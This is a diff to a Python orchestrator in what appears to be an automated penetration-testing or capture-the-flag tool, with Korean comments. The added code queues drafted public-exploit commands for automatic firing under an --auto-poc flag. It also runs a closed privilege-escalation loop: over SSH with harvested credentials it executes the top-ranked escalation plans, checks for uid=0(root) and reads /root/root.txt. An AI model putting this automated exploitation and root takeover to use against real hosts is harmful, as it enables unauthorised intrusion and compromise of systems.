@@ -254,6 +254,7 @@ class Orchestrator:
         # 계획 미리보기: 정찰·분석은 하되 제안된 enum/LLM/파일 명령은 '실행하지 않고' 보여만 준다.
         self.dry_run = dry_run
         self.exploit_exec = exploit_exec
+        self.auto_poc = auto_poc
         self._exploit_looked_up: set[str] = set()   # 제품별 공개 익스 조회 1회 가드
         self._version_probed: set[str] = set()       # 제품별 버전 노출 프로브 1회 가드
         self.poc_commands = poc_commands or []
@@ -1328,6 +1329,9 @@ class Orchestrator:
                 if draft:
                     fetch += (f"\n#   ↳ 실행 계획(제안 — 받은 소스 검토 후 조정): "
                               f"--exploit-exec --poc \"{draft}\"")
+                                      # ⚠️ RCE 표면 — --auto-poc 옵트인 + 치명작업 y/n 확인 하에서만 자동 발사.
+                    if self.exploit_exec and self.auto_poc and draft not in self.poc_commands:
+                        self.poc_commands.append(draft)
                 head = (f"# {prod} PoC 후보(버전 {version} 대조) — ⭐=자동 선택된 1순위. 받아 검토 후 "
                         f"--exploit-exec --poc \"<실행 명령>\" 로 실행(권한 확인 대상 전용):")
             else:
@@ -1383,6 +1387,24 @@ class Orchestrator:
         # 출력을 다시 스캔해 새 크리덴셜·CVE·플래그를 월드/분석에 반영한다(다음 분석이 'GTFOBins
         # 다음 수'를 제안하도록). 열거만 되먹임 — 자동 익스 실행이 아니다(생성 경계 유지).
         self._run_vuln(report, host, target)
+        # ③ 폐루프 발사 (⚠️ 권한상승 실행 표면): 랭킹된 최상위 벡터의 상승 계획을 SSH 셸에서
+        # 실행하고 uid=0 확인 → world 권한레벨 전이 → root 플래그. --exploit-exec 전용.
+        if self.auto_poc and not self.world.has_access("root") and creds:
+            from .privesc_analyze import analyze_enum
+            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
+            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
+            user, pw = creds[0]
+            sh = SSHTargetShell(target, user, pw)
+            for v in vectors[:3]:
+                # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
+                self._attempt(report, report.enum_findings,
+                              sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
+                last = report.enum_findings[-1].output or ""
+                if "uid=0(root)" in last:
+                    self.world.raise_access("root")
+                    self._attempt(report, report.enum_findings,
+                                  sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
+                    break      
     def _prepare_revshells(self, report: OrchestrationReport) -> None:
         """공격자 IP(VPN tun0 등)가 확보되면 리버스쉘 페이로드를 자동 생성해
         리포트에 담는다. 생성 전용 — 실행은 하지 않는다(안전 경계 유지).
